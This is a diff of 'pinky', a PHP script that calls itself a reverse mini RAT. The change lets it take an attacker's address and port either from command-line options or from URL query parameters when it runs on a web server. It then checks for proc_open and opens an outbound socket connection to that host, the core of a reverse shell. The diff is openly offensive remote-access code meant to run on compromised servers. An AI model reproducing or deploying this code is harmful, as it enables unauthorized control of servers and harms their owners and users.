@@ -5,27 +5,44 @@ $version = "0.1";
 $author = "David Tavarez (davidtavarez)";
 $url = "https://github.com/davidtavarez/pinky";
 
+echo "pinky - The (reverse) PHP mini RAT v" . $version . "\n";
+
 $bin = PHP_BINDIR;
 $path = realpath ( NULL ) . '/';
 
-echo "pinky - The (reverse) PHP mini RAT v" . $version . "\n";
+$address = '127.0.0.1';
+$port = 3391;
+$type = 'tcp';
 
-$params = "a:";
-$params.= "p:";
-$params.= "t:";
-
-$options = getopt ( $params );
-
-if (isset ( $options['a']) == false) {
-	exit ( "\nERROR: Server address not provided.\n\n" );
+if (PHP_SAPI === 'cli' || empty ( $_SERVER ['REMOTE_ADDR'] )) {
+	$params = "a:";
+	$params .= "p:";
+	$params .= "t:";
+	
+	$options = getopt ( $params );
+	
+	if (isset ( $options ['a'] ) == false) {
+		exit ( "\nERROR: Server address not provided.\n\n" );
+	}
+	if (isset ( $options ['p'] ) == false) {
+		exit ( "\nERROR: Port number not provided.\n\n" );
+	}
+	
+	$address = $options ['a'];
+	$port = ( int ) $options ['p'];
+	$type = isset ( $options ['t'] ) ? $options ['t'] : 'tcp';
+} else {
+	if (isset ( $_GET ['a'] ) == false) {
+		exit ( "\nERROR: Server address not provided.\n\n" );
+	}
+	if (isset ( $_GET ['p'] ) == false) {
+		exit ( "\nERROR: Port number not provided.\n\n" );
+	}
+	
+	$address = $_GET ['a'];
+	$port = ( int ) $_GET ['p'];
+	$type = isset ( $_GET ['t'] ) ? $_GET ['t'] : 'tcp';
 }
-if (isset ( $options['p']) == false) {
-	exit ( "\nERROR: Port number not provided.\n\n" );
-}
-
-$address = $options['a'];
-$port = (int) $options['p'];
-$type = isset ( $options['t']) ? $options['t']: 'tcp';
 
 echo "\nChecking if function  \e[1mproc_open\e[0m is available... ";
 
@@ -35,7 +52,7 @@ if (function_exists ( 'proc_open' )) {
 	exit ( "Failed." );
 }
 
-echo "\nTrying to connect... ";
+echo "Trying to connect with server... ";
 $session = @stream_socket_client ( $type . '://' . $address . ':' . $port, $errno, $errstr, 30 );
 if (! $session) {
 	exit ( "ERROR: " . $errstr . "(" . $errno . ")\n" );
